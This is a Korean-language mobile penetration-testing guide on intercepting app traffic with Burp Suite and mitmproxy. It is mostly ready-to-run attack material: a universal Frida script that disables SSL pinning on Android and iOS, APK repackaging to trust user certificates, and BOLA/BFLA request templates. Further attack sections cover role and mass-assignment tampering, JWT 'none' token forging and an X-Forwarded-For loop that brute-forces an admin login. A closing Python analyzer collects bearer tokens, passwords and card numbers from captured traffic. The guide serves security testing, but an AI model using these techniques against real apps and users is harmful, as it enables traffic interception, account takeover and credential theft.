# 모바일 트래픽 분석

## 목차
1. Burp Suite 모바일 프록시 설정
2. mitmproxy 자동화
3. SSL Pinning 우회 기법 (Frida Scripts)
4. Certificate Transparency 분석
5. 모바일 API 취약점 (BOLA / BFLA)
6. Python CLI: mitmproxy 기반 자동 트래픽 분석기

---

## 1. Burp Suite 모바일 프록시 설정

### Android 프록시 설정
```bash
# 방법 1: ADB를 통한 시스템 프록시 설정
adb shell settings put global http_proxy 192.168.1.100:8080

# 프록시 해제
adb shell settings delete global http_proxy
adb shell settings delete global global_http_proxy_host
adb shell settings delete global global_http_proxy_port

# 방법 2: WiFi 프록시 (기기에서 직접 설정)
# 설정 → Wi-Fi → 네트워크 → 프록시 수동 → PC IP:8080

# Burp CA 인증서 설치 (Android 7 미만)
# Burp → Proxy → Options → Export CA certificate (DER)
adb push cacert.der /sdcard/
# 기기에서: 설정 → 보안 → 인증서 설치

# Android 7+ 사용자 인증서 신뢰 (루팅 필요)
adb push cacert.der /data/local/tmp/
adb shell
openssl x509 -inform DER -subject_hash_old -in /data/local/tmp/cacert.der | head -1
# 출력값: e.g., 9a5ba575
cp /data/local/tmp/cacert.der /system/etc/security/cacerts/9a5ba575.0
chmod 644 /system/etc/security/cacerts/9a5ba575.0
```

### iOS 프록시 설정
```bash
# WiFi 프록시 설정 (기기에서)
# 설정 → Wi-Fi → 네트워크 이름 → 프록시 구성 → 수동
# 서버: PC IP, 포트: 8080

# Burp CA 인증서 설치 (iOS)
# Safari에서 http://burpsuite/cert 접속 → 프로파일 설치
# 설정 → 일반 → VPN 및 기기 관리 → Portswigger CA → 설치
# 설정 → 일반 → 정보 → 인증서 신뢰 설정 → Portswigger CA ON
```

### Burp Suite 설정
```
# Proxy → Options:
# - Bind to port: 8080
# - Bind to address: All interfaces
# - 인증서: Portswigger CA (기본값)

# HTTPS 투명 프록시 (TLS 없는 앱 대응)
# Project Options → Connections → Upstream Proxy → 필요시 설정

# 유용한 Match & Replace 규칙:
# Request Header: User-Agent → 변조
# Response Body: "is_premium":false → "is_premium":true
# Response Header: X-Rate-Limit-* → 제거
```

### Burp Suite + MagiskTrustUserCerts (Android, 루팅)
```bash
# Magisk 모듈 설치로 사용자 인증서를 시스템 인증서로 승격
# https://github.com/NVISOsecurity/MagiskTrustUserCerts

# 또는 직접 처리
adb shell "su -c 'mount -o rw,remount /system'"
adb push burp_cert.cer /system/etc/security/cacerts/
adb shell "su -c 'chmod 644 /system/etc/security/cacerts/burp_cert.cer'"
```

---

## 2. mitmproxy 자동화

### 설치 및 기본 사용
```bash
pip install mitmproxy

# 기본 인터랙티브 모드
mitmproxy --listen-port 8080

# CLI 모드 (덤프만)
mitmdump --listen-port 8080 -w traffic.bin

# 기록된 트래픽 재생
mitmdump -r traffic.bin --set hardump=traffic.har

# 웹 인터페이스
mitmweb --listen-port 8080

# SOCKS5 프록시 모드
mitmdump --mode socks5 --listen-port 1080

# 투명 프록시 (iptables 필요)
mitmdump --mode transparent --listen-port 8080
```

### 기본 인라인 스크립트
```python
# intercept_all.py - 모든 요청/응답 로깅
from mitmproxy import http, ctx
import json

class Interceptor:
    def request(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        ctx.log.info(f"[REQ] {req.method} {req.pretty_url}")

        # POST 본문 출력
        if req.method == "POST" and req.content:
            content_type = req.headers.get("content-type", "")
            if "json" in content_type:
                try:
                    body = json.loads(req.content)
                    ctx.log.info(f"[BODY] {json.dumps(body, ensure_ascii=False)[:200]}")
                except Exception:
                    pass

    def response(self, flow: http.HTTPFlow) -> None:
        resp = flow.response
        ctx.log.info(
            f"[RESP] {resp.status_code} "
            f"{flow.request.pretty_url} "
            f"({len(resp.content)} bytes)"
        )

addons = [Interceptor()]
```

```bash
mitmdump -s intercept_all.py --listen-port 8080
```

### iptables 투명 프록시 (Linux/루팅 Android)
```bash
# PC에서 투명 프록시 설정 (기기 트래픽을 라우팅할 때)
sysctl -w net.ipv4.ip_forward=1

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
    -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
    -j REDIRECT --to-port 8080

mitmdump --mode transparent --listen-port 8080 -s intercept_all.py

# 해제
iptables -t nat -F
```

---

## 3. SSL Pinning 우회 기법 (Frida Scripts)

### 범용 SSL Pinning 우회 (Android + iOS)
```javascript
// universal_ssl_bypass.js
// Android: OkHttp, Retrofit, Volley, HttpsURLConnection
// iOS: URLSession, AFNetworking, TrustKit

Java.perform(function() {
    var array_list = Java.use("java.util.ArrayList");

    // ── OkHttp3 CertificatePinner ──
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload(
            'java.lang.String', 'java.util.List'
        ).implementation = function(a, b) {
            console.log('[Android] OkHttp3 CertificatePinner.check bypassed');
        };
        CertificatePinner.check.overload(
            'java.lang.String', '[Ljava.security.cert.Certificate;'
        ).implementation = function(a, b) {
            console.log('[Android] OkHttp3 CertificatePinner.check (cert) bypassed');
        };
    } catch(e) {}

    // ── OkHttp3 SSLPinning (Builder) ──
    try {
        var builder = Java.use('okhttp3.OkHttpClient$Builder');
        builder.certificatePinner.implementation = function(pinner) {
            console.log('[Android] OkHttpClient.Builder.certificatePinner bypassed');
            return this;
        };
    } catch(e) {}

    // ── HttpsURLConnection ──
    try {
        var HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function(verifier) {
            console.log('[Android] setDefaultHostnameVerifier bypassed');
        };
        HttpsURLConnection.setSSLSocketFactory.implementation = function(sf) {
            console.log('[Android] setSSLSocketFactory bypassed');
        };
    } catch(e) {}

    // ── TrustManager 전체 신뢰 ──
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext       = Java.use('javax.net.ssl.SSLContext');

        var TrustAllCerts = Java.registerClass({
            name: 'com.bypass.TrustAllCerts',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() {
                    return Java.array('java.security.cert.X509Certificate', []);
                }
            }
        });

        var sc = SSLContext.getInstance('TLS');
        sc.init(
            null,
            Java.array('javax.net.ssl.TrustManager', [TrustAllCerts.$new()]),
            Java.use('java.security.SecureRandom').$new()
        );
        SSLContext.getDefault.implementation = function() { return sc; };
    } catch(e) { console.log('[!] TrustManager override failed: ' + e); }

    // ── Conscrypt (Android 8+) ──
    try {
        var Platform = Java.use('com.android.org.conscrypt.Platform');
        Platform.checkServerTrusted.overload(
            'javax.net.ssl.X509TrustManager',
            '[Ljava.security.cert.X509Certificate;',
            'java.lang.String',
            'com.android.org.conscrypt.AbstractConscryptSocket'
        ).implementation = function() {
            console.log('[Android] Conscrypt checkServerTrusted bypassed');
        };
    } catch(e) {}

    // ── Appcelerator Titanium ──
    try {
        var PinningTrustManager = Java.use('appcelerator.https.PinningTrustManager');
        PinningTrustManager.checkServerTrusted.implementation = function() {
            console.log('[Android] Titanium PinningTrustManager bypassed');
        };
    } catch(e) {}
});

// ── iOS 부분 (동일 스크립트) ──
if (ObjC.available) {
    ObjC.schedule(ObjC.mainQueue, function() {
        // SecTrustEvaluateWithError
        var SecTrustEvaluateWithError = Module.findExportByName(
            'Security', 'SecTrustEvaluateWithError'
        );
        if (SecTrustEvaluateWithError) {
            Interceptor.attach(SecTrustEvaluateWithError, {
                onLeave: function(retval) { retval.replace(1); }
            });
        }

        // AFNetworking
        try {
            var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
            if (AFSecurityPolicy) {
                AFSecurityPolicy['+ defaultPolicy'].implementation = function() {
                    var p = ObjC.classes.AFSecurityPolicy['+ defaultPolicy'].call(this);
                    p['- setSSLPinningMode:'](0);
                    p['- setAllowInvalidCertificates:'](1);
                    return p;
                };
            }
        } catch(e) {}
    });
}
```

```bash
# Android
frida -U -f com.target.app -l universal_ssl_bypass.js --no-pause

# iOS
frida -U -n "TargetApp" -l universal_ssl_bypass.js

# objection (래퍼)
objection --gadget com.target.app explore
# > android sslpinning disable
# > ios sslpinning disable
```

### Network Security Config 수정 (Android, 재패키징)
```xml
<!-- res/xml/network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
</network-security-config>
```

```bash
# apktool로 디컴파일 → 수정 → 재패키징
apktool d target.apk -o decompiled/
# AndroidManifest.xml에 추가:
# android:networkSecurityConfig="@xml/network_security_config"

# network_security_config.xml 생성/수정

apktool b decompiled/ -o modified.apk
zipalign -v 4 modified.apk aligned.apk
apksigner sign --ks debug.keystore aligned.apk
```

---

## 4. Certificate Transparency 분석

### CT 로그 활용
```bash
# crt.sh에서 도메인 인증서 조회
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    python3 -c "import sys,json; [print(x['name_value']) for x in json.load(sys.stdin)]" | \
    sort -u

# subfinder (서브도메인 수집)
subfinder -d target.com -o subdomains.txt

# CT 로그에서 API 서버 발견
curl -s "https://crt.sh/?q=api.target.com&output=json" | \
    python3 -c "
import sys, json
data = json.load(sys.stdin)
for cert in data:
    print(cert.get('name_value', ''), cert.get('not_before', ''))
" | sort -u

# Certificate 핀 값 추출 (앱과 비교)
echo | openssl s_client -connect api.target.com:443 2>/dev/null | \
    openssl x509 -pubkey -noout | \
    openssl pkey -pubin -outform der | \
    openssl dgst -sha256 -binary | \
    base64
```

### 인증서 분석
```bash
# 서버 인증서 정보 추출
openssl s_client -connect target.com:443 -showcerts 2>/dev/null \
    | openssl x509 -text -noout

# 핀 정보 확인 (HPKP)
curl -I https://target.com | grep Public-Key-Pins

# Certificate Transparency SCT 확인
openssl s_client -connect target.com:443 2>/dev/null | \
    openssl x509 -noout -text | grep -A2 "CT Precertificate"
```

---

## 5. 모바일 API 취약점 (BOLA / BFLA)

### BOLA (Broken Object Level Authorization)
```bash
# 다른 사용자 계정으로 인증 후 자신의 리소스 ID를 타 사용자 ID로 교체
# 정상 요청
GET /api/v1/users/12345/profile
Authorization: Bearer USER_A_TOKEN

# BOLA 시도: USER_A 토큰으로 USER_B 프로필 접근
GET /api/v1/users/12346/profile
Authorization: Bearer USER_A_TOKEN

# Burp Intruder로 자동화
# Position: /api/v1/users/§12345§/profile
# Payload: 12340~12360 숫자 시퀀스
# 200 vs 403 응답 차이로 취약 여부 판별

# 주요 패턴
GET  /api/orders/§ORDER_ID§
GET  /api/invoices/§INVOICE_ID§
GET  /api/messages/§MSG_ID§
PUT  /api/users/§USER_ID§/settings
DELETE /api/posts/§POST_ID§
```

### BFLA (Broken Function Level Authorization)
```bash
# 일반 사용자 토큰으로 관리자 기능 접근 시도
# 정상 사용자 플로우에서 발견된 엔드포인트
GET /api/v1/admin/users
POST /api/v1/admin/reset-passwords
DELETE /api/v1/admin/users/12345
GET /api/v1/reports/all

# HTTP 메서드 변조
# 원래: GET /api/orders → POST /api/orders (생성 권한)
# 원래: PATCH /api/user → PUT /api/user (전체 수정)

# 역할 파라미터 변조
POST /api/register
{"username": "hacker", "role": "admin"}

# JWT 클레임 변조
# payload: {"sub":"123","role":"user"} → {"sub":"123","role":"admin"}
# (서명 검증 없을 시)
```

### GraphQL BOLA/BFLA
```bash
# 인트로스펙션으로 스키마 확인
curl -X POST https://api.target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 다른 사용자 데이터 접근
curl -X POST https://api.target.com/graphql \
    -H "Authorization: Bearer USER_A_TOKEN" \
    -d '{"query":"{ user(id: \"USER_B_ID\") { email phone_number } }"}'

# 뮤테이션으로 권한 상승
curl -X POST https://api.target.com/graphql \
    -d '{"query":"mutation { updateUserRole(id:\"123\", role:\"admin\") { success } }"}'
```

### 모바일 API 추가 취약점
```bash
# Mass Assignment (과도한 파라미터 바인딩)
PATCH /api/v1/users/123
{"name": "John", "is_admin": true, "credit_balance": 99999}

# Rate Limit 우회
# X-Forwarded-For 헤더 변조
for i in $(seq 1 100); do
    curl -X POST https://api.target.com/auth/login \
        -H "X-Forwarded-For: 10.0.0.$i" \
        -d '{"user":"admin","pass":"wrong"}'
done

# API 버전 다운그레이드 (구버전 취약점)
GET /api/v1/admin/... (v2에서 막힌 경우 v1 시도)
GET /api/beta/...
GET /api/internal/...

# JWT none 알고리즘 공격
# 헤더의 alg를 none으로 변경 후 서명 제거
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
```

---

## 6. Python CLI: mitmproxy 기반 자동 트래픽 분석기

```python
#!/usr/bin/env python3
"""
mitmproxy 기반 모바일 트래픽 자동 분석기
모드 1 (프록시): python3 mobile_traffic_analyzer.py proxy --port 8080
모드 2 (오프라인): python3 mobile_traffic_analyzer.py analyze -f traffic.bin -o report.json
모드 3 (HAR 분석): python3 mobile_traffic_analyzer.py har -f traffic.har
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any


# ──────────────────────────────────────────
# 의존성 확인
# ──────────────────────────────────────────
try:
    from mitmproxy import http, ctx, options
    from mitmproxy.tools.dump import DumpMaster
    MITMPROXY_AVAILABLE = True
except ImportError:
    MITMPROXY_AVAILABLE = False


# ──────────────────────────────────────────
# 데이터 클래스
# ──────────────────────────────────────────
@dataclass
class RequestRecord:
    timestamp: float
    method: str
    url: str
    host: str
    path: str
    status_code: int
    request_headers: dict[str, str]
    response_headers: dict[str, str]
    request_body: str
    response_body: str
    content_type: str
    response_size: int
    duration_ms: float


@dataclass
class APIFinding:
    finding_type: str
    severity: str       # HIGH / MEDIUM / LOW / INFO
    url: str
    description: str
    evidence: str = ""


@dataclass
class TrafficReport:
    capture_duration_sec: float = 0.0
    total_requests: int = 0
    unique_hosts: list[str] = field(default_factory=list)
    endpoints: list[str] = field(default_factory=list)
    findings: list[APIFinding] = field(default_factory=list)
    sensitive_data: list[dict[str, str]] = field(default_factory=list)
    auth_tokens: list[dict[str, str]] = field(default_factory=list)
    unencrypted_requests: list[str] = field(default_factory=list)
    api_stats: dict[str, int] = field(default_factory=dict)


# ──────────────────────────────────────────
# 패턴 정의
# ──────────────────────────────────────────
SENSITIVE_PATTERNS: dict[str, re.Pattern[str]] = {
    "credit_card":   re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b'),
    "ssn":           re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
    "email":         re.compile(r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b'),
    "phone_kr":      re.compile(r'(?:010|011|016|017|018|019)-?\d{3,4}-?\d{4}'),
    "password_field":re.compile(r'"(?:password|passwd|pwd|pass)"\s*:\s*"([^"]{4,})"', re.IGNORECASE),
    "jwt":           re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+'),
    "api_key":       re.compile(r'"(?:api_key|apikey|api-key|x-api-key)"\s*:\s*"([^"]{8,})"', re.IGNORECASE),
    "bearer_token":  re.compile(r'Bearer\s+([A-Za-z0-9._\-+/]{20,})'),
    "aws_key":       re.compile(r'AKIA[0-9A-Z]{16}'),
}

BOLA_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r'/(?:users?|accounts?|profiles?|orders?|invoices?|messages?)/(\d+)', re.IGNORECASE),
    re.compile(r'/(?:api/v\d+/)?(?:admin|internal)/'),
]

INTERESTING_HEADERS = [
    'x-api-key', 'authorization', 'x-auth-token', 'x-session-id',
    'x-user-id', 'x-forwarded-for', 'x-real-ip',
]


# ──────────────────────────────────────────
# 분석 엔진
# ──────────────────────────────────────────
class TrafficAnalyzer:
    def __init__(self) -> None:
        self.records: list[RequestRecord] = []
        self.report = TrafficReport()
        self._start_time = time.time()

    def add_record(self, record: RequestRecord) -> None:
        self.records.append(record)

    def analyze_record(self, record: RequestRecord) -> list[APIFinding]:
        findings: list[APIFinding] = []

        # HTTP (비암호화) 탐지
        if record.url.startswith("http://") and not record.host.startswith("localhost"):
            self.report.unencrypted_requests.append(record.url)
            findings.append(APIFinding(
                finding_type="UNENCRYPTED_TRAFFIC",
                severity="HIGH",
                url=record.url,
                description="HTTP 평문 통신 탐지 (MITM 위험)",
            ))

        # BOLA 패턴 탐지
        for pattern in BOLA_PATTERNS:
            m = pattern.search(record.path)
            if m:
                findings.append(APIFinding(
                    finding_type="POTENTIAL_BOLA",
                    severity="MEDIUM",
                    url=record.url,
                    description=f"리소스 ID 기반 접근 탐지 (BOLA 가능성): {record.path}",
                    evidence=m.group(0),
                ))

        # 관리자/내부 엔드포인트
        if re.search(r'/(?:admin|internal|debug|test|dev|beta)/', record.path, re.IGNORECASE):
            findings.append(APIFinding(
                finding_type="SENSITIVE_ENDPOINT",
                severity="HIGH",
                url=record.url,
                description=f"민감 엔드포인트 탐지: {record.path}",
            ))

        # 민감 데이터 탐지 (요청 + 응답)
        combined_body = record.request_body + " " + record.response_body
        for pat_name, pattern in SENSITIVE_PATTERNS.items():
            match = pattern.search(combined_body)
            if match:
                found_val = match.group()[:60]
                if pat_name in ("jwt", "bearer_token"):
                    self.report.auth_tokens.append({
                        "type": pat_name,
                        "value": found_val,
                        "url": record.url,
                    })
                else:
                    self.report.sensitive_data.append({
                        "type": pat_name,
                        "value": found_val,
                        "url": record.url,
                    })

        # 인증 없는 API
        has_auth = any(
            h.lower() in ('authorization', 'x-auth-token', 'x-api-key')
            for h in record.request_headers
        )
        if not has_auth and record.method in ("POST", "PUT", "PATCH", "DELETE"):
            if record.status_code == 200:
                findings.append(APIFinding(
                    finding_type="MISSING_AUTH",
                    severity="HIGH",
                    url=record.url,
                    description=f"인증 헤더 없이 {record.method} 요청 성공 (상태: {record.status_code})",
                ))

        # Rate Limit 헤더 부재 (로그인 등)
        if any(kw in record.path.lower() for kw in ("login", "auth", "signin", "password")):
            has_rate_limit = any(
                "rate" in h.lower() or "x-ratelimit" in h.lower()
                for h in record.response_headers
            )
            if not has_rate_limit and record.method == "POST":
                findings.append(APIFinding(
                    finding_type="NO_RATE_LIMIT",
                    severity="MEDIUM",
                    url=record.url,
                    description="인증 엔드포인트에 Rate Limit 헤더 없음 (브루트포스 위험)",
                ))

        # CORS 설정 문제
        cors_origin = record.response_headers.get("access-control-allow-origin", "")
        if cors_origin == "*" and has_auth:
            findings.append(APIFinding(
                finding_type="CORS_WILDCARD",
                severity="MEDIUM",
                url=record.url,
                description="인증 필요 엔드포인트에 CORS Access-Control-Allow-Origin: * 설정",
            ))

        # 서버 정보 노출
        server_header = record.response_headers.get("server", "")
        x_powered_by  = record.response_headers.get("x-powered-by", "")
        if server_header or x_powered_by:
            findings.append(APIFinding(
                finding_type="INFO_DISCLOSURE",
                severity="LOW",
                url=record.url,
                description=f"서버 정보 노출: Server={server_header}, X-Powered-By={x_powered_by}",
            ))

        return findings

    def finalize(self) -> TrafficReport:
        self.report.capture_duration_sec = time.time() - self._start_time
        self.report.total_requests = len(self.records)

        hosts: set[str] = set()
        endpoints: set[str] = set()
        method_counts: dict[str, int] = defaultdict(int)

        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = {executor.submit(self.analyze_record, r): r for r in self.records}
            for future in as_completed(futures):
                try:
                    findings = future.result()
                    self.report.findings.extend(findings)
                except Exception as e:
                    print(f"[!] 레코드 분석 오류: {e}", file=sys.stderr)

        for r in self.records:
            hosts.add(r.host)
            endpoints.add(f"{r.method} {r.path}")
            method_counts[r.method] += 1

        self.report.unique_hosts = sorted(hosts)
        self.report.endpoints    = sorted(endpoints)
        self.report.api_stats    = dict(method_counts)

        # 중복 제거
        seen_findings: set[str] = set()
        unique_findings: list[APIFinding] = []
        for f in self.report.findings:
            key = f"{f.finding_type}:{f.url}"
            if key not in seen_findings:
                seen_findings.add(key)
                unique_findings.append(f)
        self.report.findings = unique_findings

        # 심각도 순 정렬
        order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
        self.report.findings.sort(key=lambda x: order.get(x.severity, 9))

        return self.report


# ──────────────────────────────────────────
# mitmproxy 애드온 (라이브 캡처)
# ──────────────────────────────────────────
if MITMPROXY_AVAILABLE:
    class MobileTrafficAddon:
        def __init__(self, analyzer: TrafficAnalyzer, output_path: str | None = None) -> None:
            self.analyzer = analyzer
            self.output_path = output_path
            self._pending: dict[str, float] = {}

        def request(self, flow: http.HTTPFlow) -> None:
            self._pending[flow.id] = time.time()
            req = flow.request
            ctx.log.info(f"[>] {req.method} {req.pretty_url}")

        def response(self, flow: http.HTTPFlow) -> None:
            req  = flow.request
            resp = flow.response
            start_ts = self._pending.pop(flow.id, time.time())
            duration = (time.time() - start_ts) * 1000

            try:
                req_body  = req.content.decode('utf-8', errors='replace') if req.content else ""
                resp_body = resp.content.decode('utf-8', errors='replace') if resp.content else ""
            except Exception:
                req_body = resp_body = ""

            record = RequestRecord(
                timestamp=start_ts,
                method=req.method,
                url=req.pretty_url,
                host=req.host,
                path=req.path,
                status_code=resp.status_code,
                request_headers=dict(req.headers),
                response_headers={k.lower(): v for k, v in resp.headers.items()},
                request_body=req_body[:2000],
                response_body=resp_body[:2000],
                content_type=resp.headers.get("content-type", ""),
                response_size=len(resp.content) if resp.content else 0,
                duration_ms=duration,
            )
            self.analyzer.add_record(record)

        def done(self) -> None:
            report = self.analyzer.finalize()
            _print_summary(report)
            if self.output_path:
                Path(self.output_path).write_text(
                    json.dumps(asdict(report), indent=2, ensure_ascii=False),
                    encoding="utf-8"
                )
                print(f"\n[+] 보고서 저장: {self.output_path}")


# ──────────────────────────────────────────
# HAR 파일 분석
# ──────────────────────────────────────────
def analyze_har(har_path: str) -> TrafficReport:
    analyzer = TrafficAnalyzer()

    with open(har_path, encoding="utf-8") as f:
        har_data: dict[str, Any] = json.load(f)

    entries = har_data.get("log", {}).get("entries", [])
    print(f"[*] HAR 엔트리: {len(entries)}개")

    for entry in entries:
        req  = entry.get("request", {})
        resp = entry.get("response", {})
        url  = req.get("url", "")

        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            host   = parsed.netloc
            path   = parsed.path
        except Exception:
            host = path = ""

        req_body  = req.get("postData", {}).get("text", "")[:2000]
        resp_body = resp.get("content", {}).get("text", "")[:2000]

        req_headers  = {h["name"].lower(): h["value"] for h in req.get("headers", [])}
        resp_headers = {h["name"].lower(): h["value"] for h in resp.get("headers", [])}

        record = RequestRecord(
            timestamp=time.time(),
            method=req.get("method", ""),
            url=url,
            host=host,
            path=path,
            status_code=resp.get("status", 0),
            request_headers=req_headers,
            response_headers=resp_headers,
            request_body=req_body,
            response_body=resp_body,
            content_type=resp_headers.get("content-type", ""),
            response_size=resp.get("content", {}).get("size", 0),
            duration_ms=entry.get("time", 0),
        )
        analyzer.add_record(record)

    return analyzer.finalize()


# ──────────────────────────────────────────
# 출력 함수
# ──────────────────────────────────────────
def _print_summary(report: TrafficReport) -> None:
    bar = "=" * 65
    print(f"\n{bar}")
    print("  모바일 트래픽 분석 보고서")
    print(bar)
    print(f"  총 요청 수     : {report.total_requests}")
    print(f"  고유 호스트 수 : {len(report.unique_hosts)}")
    print(f"  발견 항목      : {len(report.findings)}")
    print(f"  민감 데이터    : {len(report.sensitive_data)}")
    print(f"  인증 토큰      : {len(report.auth_tokens)}")
    print(f"  평문 HTTP 요청 : {len(report.unencrypted_requests)}")
    print()

    # 심각도별 집계
    sev_counts: dict[str, int] = defaultdict(int)
    for f in report.findings:
        sev_counts[f.severity] += 1
    if sev_counts:
        print("  발견 항목 심각도:")
        for sev in ("HIGH", "MEDIUM", "LOW", "INFO"):
            cnt = sev_counts.get(sev, 0)
            if cnt:
                print(f"    {sev:8s}: {cnt}")
        print()

    # 상위 발견사항
    print("[!] 주요 발견사항 (상위 15개):")
    for f in report.findings[:15]:
        print(f"    [{f.severity}] {f.finding_type}: {f.url[:70]}")
        if f.description:
            print(f"           {f.description[:80]}")
    print()

    # 호스트 목록
    if report.unique_hosts:
        print(f"[*] 통신 호스트 ({len(report.unique_hosts)}):")
        for h in report.unique_hosts[:15]:
            print(f"    {h}")
    print()

    # 인증 토큰
    if report.auth_tokens:
        print(f"[!] 수집된 인증 토큰 ({len(report.auth_tokens)}):")
        for t in report.auth_tokens[:5]:
            print(f"    [{t['type']}] {t['value'][:60]}")
    print(bar)


# ──────────────────────────────────────────
# CLI
# ──────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="mobile_traffic_analyzer",
        description="mitmproxy 기반 모바일 트래픽 자동 분석기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # 라이브 프록시 (Ctrl+C로 종료 후 보고서 생성)
  python3 mobile_traffic_analyzer.py proxy --port 8080 -o report.json

  # 저장된 mitmproxy 트래픽 분석
  python3 mobile_traffic_analyzer.py analyze -f traffic.bin -o report.json

  # HAR 파일 분석 (Burp / Chrome DevTools 내보내기)
  python3 mobile_traffic_analyzer.py har -f traffic.har -o report.json
        """,
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # proxy 모드
    proxy_p = subparsers.add_parser("proxy", help="라이브 프록시 캡처 및 분석")
    proxy_p.add_argument("--port", type=int, default=8080, help="프록시 포트 (기본: 8080)")
    proxy_p.add_argument("--host", default="0.0.0.0", help="바인드 주소 (기본: 0.0.0.0)")
    proxy_p.add_argument("-o", "--output", help="JSON 보고서 저장 경로")

    # analyze 모드 (mitmproxy .bin 파일)
    analyze_p = subparsers.add_parser("analyze", help="저장된 mitmproxy 트래픽 분석")
    analyze_p.add_argument("-f", "--file", required=True, help="mitmproxy .bin 파일 경로")
    analyze_p.add_argument("-o", "--output", help="JSON 보고서 저장 경로")

    # har 모드
    har_p = subparsers.add_parser("har", help="HAR 파일 분석")
    har_p.add_argument("-f", "--file", required=True, help="HAR 파일 경로")
    har_p.add_argument("-o", "--output", help="JSON 보고서 저장 경로")
    har_p.add_argument("--filter-host", help="특정 호스트만 분석")

    return parser


def cmd_proxy(args: argparse.Namespace) -> None:
    if not MITMPROXY_AVAILABLE:
        print("[!] mitmproxy 미설치: pip install mitmproxy", file=sys.stderr)
        sys.exit(1)

    import asyncio

    analyzer = TrafficAnalyzer()
    addon = MobileTrafficAddon(analyzer, args.output)

    async def run_proxy() -> None:
        opts = options.Options(
            listen_host=args.host,
            listen_port=args.port,
        )
        master = DumpMaster(opts, with_termlog=True, with_dumper=False)
        master.addons.add(addon)
        print(f"[*] 프록시 시작: {args.host}:{args.port} (Ctrl+C로 종료)")
        try:
            await master.run()
        except KeyboardInterrupt:
            master.shutdown()

    asyncio.run(run_proxy())


def cmd_analyze(args: argparse.Namespace) -> None:
    if not MITMPROXY_AVAILABLE:
        print("[!] mitmproxy 미설치: pip install mitmproxy", file=sys.stderr)
        sys.exit(1)

    from mitmproxy.io import FlowReader

    file_path = Path(args.file)
    if not file_path.exists():
        print(f"[!] 파일 없음: {file_path}", file=sys.stderr)
        sys.exit(1)

    analyzer = TrafficAnalyzer()
    print(f"[*] 트래픽 파일 로드: {file_path}")

    with open(file_path, "rb") as f:
        reader = FlowReader(f)
        count = 0
        for flow in reader.stream():
            if not isinstance(flow, http.HTTPFlow) or not flow.response:
                continue
            req  = flow.request
            resp = flow.response
            try:
                req_body  = req.content.decode('utf-8', errors='replace')[:2000]
                resp_body = resp.content.decode('utf-8', errors='replace')[:2000]
            except Exception:
                req_body = resp_body = ""

            record = RequestRecord(
                timestamp=req.timestamp_start,
                method=req.method,
                url=req.pretty_url,
                host=req.host,
                path=req.path,
                status_code=resp.status_code,
                request_headers=dict(req.headers),
                response_headers={k.lower(): v for k, v in resp.headers.items()},
                request_body=req_body,
                response_body=resp_body,
                content_type=resp.headers.get("content-type", ""),
                response_size=len(resp.content) if resp.content else 0,
                duration_ms=(req.timestamp_end - req.timestamp_start) * 1000 if req.timestamp_end else 0,
            )
            analyzer.add_record(record)
            count += 1

    print(f"[+] {count}개 플로우 로드 완료")
    report = analyzer.finalize()
    _print_summary(report)

    if args.output:
        out_path = Path(args.output)
        out_path.write_text(
            json.dumps(asdict(report), indent=2, ensure_ascii=False),
            encoding="utf-8"
        )
        print(f"[+] 보고서 저장: {out_path}")


def cmd_har(args: argparse.Namespace) -> None:
    file_path = Path(args.file)
    if not file_path.exists():
        print(f"[!] 파일 없음: {file_path}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] HAR 파일 분석: {file_path}")
    report = analyze_har(str(file_path))
    _print_summary(report)

    if args.output:
        out_path = Path(args.output)
        out_path.write_text(
            json.dumps(asdict(report), indent=2, ensure_ascii=False),
            encoding="utf-8"
        )
        print(f"[+] 보고서 저장: {out_path}")


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if args.command == "proxy":
        cmd_proxy(args)
    elif args.command == "analyze":
        cmd_analyze(args)
    elif args.command == "har":
        cmd_har(args)
    else:
        parser.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### 설치 및 실행
```bash
pip install mitmproxy

# 라이브 프록시 캡처 (기기 프록시를 PC IP:8080으로 설정)
python3 mobile_traffic_analyzer.py proxy --port 8080 -o report.json

# Burp Suite에서 HAR 내보내기 후 분석
python3 mobile_traffic_analyzer.py har -f burp_export.har -o report.json

